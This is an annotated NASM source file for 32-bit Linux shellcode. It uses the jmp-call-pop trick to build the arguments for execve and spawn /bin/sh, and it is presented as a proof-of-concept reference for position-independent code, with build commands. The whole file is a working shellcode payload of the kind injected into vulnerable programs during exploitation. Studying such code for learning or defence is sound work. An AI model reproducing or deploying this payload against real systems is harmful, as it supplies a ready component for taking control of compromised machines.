; lnx-execve-callsub-x86_32.s
; A simple execve(2) shellcode with a call subroutine to maintain registers
; values, the stack frame and to be used as a reference for relative or
; position independent coding.
;
; This shellcode may seg fault on a DEP enabled host because the .text section
; is not marked writeable by default with NASM and LD.
; For this proof of concept, the .text section has been marked for execution
; and properly aligned (see nasm/linker parameter below):
;
; nasm -f elf32 lnx-execve-callsub-x86_32.s
; ld -m elf_i386 --omagic lnx-execve-callsub-x86_32.o -o \
; lnx-execve-callsub-x86_32
BITS 32

Section	.text progbits alloc exec write ; make .text section executable and
					; writeable.

  global _start

  _start:
    jmp short	_caller

  scexecve:
    pop		esi			; POP the top of the stack to ESI, memory address of our string.
    xor		eax, eax		; Zero out EAX register.
    mov byte	[esi + 7], al		; Null terminate the '/bin/sh' filename string.
    lea		ebx, [esi]		; Copy the memory address of our string from the pointer in ESI to EBX.
    mov long	[esi + 8], ebx		; Copy the above address back at ESI + 8, our "A" placeholder.
    mov long	[esi + 12], eax		; Copy all nulls bytes from EAX to our null pointer at ESI +12. 
    mov byte	al, 0x0b		; Copy the execve(2) system call number to the AL register.
    mov		ebx, esi		; Copy the content of ESI register, the (memory address of our string to EBX (argv1).
    lea		ecx, [esi + 8]		; Copy the filename char string pointer to ECX (argv2).
    lea		edx, [esi + 12]		; Copy the null register to EDX (argv3).
    int		0x80			; Interupt call vector 0x80.

  _caller:
    Call	scexecve
    db		'/bin/shNAAAANNNN'	; Placeholder: /bin/sh<null><pointer to filename string><4 x nulls>
